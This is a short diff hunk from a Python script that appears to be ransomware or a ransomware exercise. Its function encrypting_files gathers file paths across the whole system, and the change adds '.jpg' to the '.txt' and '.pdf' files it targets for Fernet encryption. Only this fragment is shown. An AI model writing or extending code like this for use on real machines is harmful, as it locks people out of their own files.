@@ -55,7 +55,7 @@ def create_fernet_key():
 def encrypting_files():
 
     # Defining which files to encrypt
-    file_extensions = ['.txt', '.pdf']
+    file_extensions = ['.txt', '.pdf', '.jpg']
 
     # Pulling path of all files in the system and checking for matching extentions
     file_paths = []
